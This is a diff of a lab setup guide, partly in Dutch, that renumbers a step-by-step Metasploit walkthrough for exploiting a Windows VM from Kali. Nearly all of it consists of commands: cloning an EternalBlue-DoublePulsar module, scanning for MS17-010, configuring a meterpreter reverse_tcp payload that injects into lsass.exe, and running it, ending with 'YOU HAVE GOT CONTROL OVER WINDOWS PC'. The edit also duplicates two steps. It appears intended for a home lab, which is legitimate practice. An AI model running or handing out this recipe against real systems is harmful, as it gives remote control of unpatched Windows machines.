@@ -1,3 +1,4 @@
+# SETUP
 1) Run "Setup Script"
 	- make sure Kali-2023.4-64bit is unzipped so the folder 64bit is accessible in the root
 	- make sure the windows iso file is accessible in the root
@@ -16,56 +17,60 @@
 
 # KALI VM
 
-- sudo apt-get update
+1: ```sudo apt-get update```
 
-- git clone https://github.com/w0rtw0rt/EternalBlue
+2: ```git clone https://github.com/w0rtw0rt/EternalBlue```
 
-- msfconsole
+3: ```sudo apt-get update```
 
-- exit
+4: ```git clone https://github.com/w0rtw0rt/EternalBlue```
 
-- sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb
+5: ```msfconsole```
 
-- sudo dpkg --add-architecture i386
+6: ```exit```
 
-- sudo apt-get install libwine (of gewoon wine?)
+7: ```sudo cp EternalBlue/Eternalblue-Doublepulsar-Metasploit/eternalblue-doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb```
 
-- sudo mkdir /root/.wine
+8: ```sudo dpkg --add-architecture i386```
 
-- sudo mkdir /root/.wine/c_drive ?
+9: ```sudo apt-get install libwine (of gewoon wine?)```
 
-- sudo metasploit
+10: ```sudo mkdir /root/.wine```
 
-- use auxiliary/scanner/smb/smb_ms17_010
+11: ```sudo mkdir /root/.wine/c_drive```
 
-- set RHOSTS <Windows IP>
+12: ```sudo metasploit```
 
-- run
+13: ```use auxiliary/scanner/smb/smb_ms17_010```
 
-- use payload/windows/x64/meterpreter/reverse_tcp
+14: ```set RHOSTS <Windows IP>```
 
-- set LHOST <Kali IP>
+15: ```run```
 
-- use exploit/windows/smb/eternalblue_doublepulsar
+16: ```use payload/windows/x64/meterpreter/reverse_tcp```
 
-- set payload payload/windows/x64/meterpreter/reverse_tcp
+17: ```set LHOST <Kali IP>```
 
-- set TARGET 8
+18: ```use exploit/windows/smb/eternalblue_doublepulsar```
 
-- set RHOSTS <windows ip>
+19: ```set payload payload/windows/x64/meterpreter/reverse_tcp```
 
-- set LHOST <kali ip>
+20: ```set TARGET 8```
 
-- set TARGETARCHITECTURE x64
+21: ```set RHOSTS <windows ip>```
 
-- set PROCESSINJECT lsass.exe
+22: ```set LHOST <kali ip>```
 
-- set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/
+23: ```set TARGETARCHITECTURE x64```
 
-- set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/
+24: ```set PROCESSINJECT lsass.exe```
 
-- set WINEPATH /home/osboxes/.wine/drive_c/
+25: ```set DOUBLEPULSARPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
 
-- run
+26: ```set ETERNALBLUEPATH /home/osboxes/EternalBlue/Eternalblue-Doublepulsar-Metasploit/deps/```
+
+27: ```set WINEPATH /home/osboxes/.wine/drive_c/```
+
+28: ```run```
 
 YOU HAVE GOT CONTROL OVER WINDOWS PC
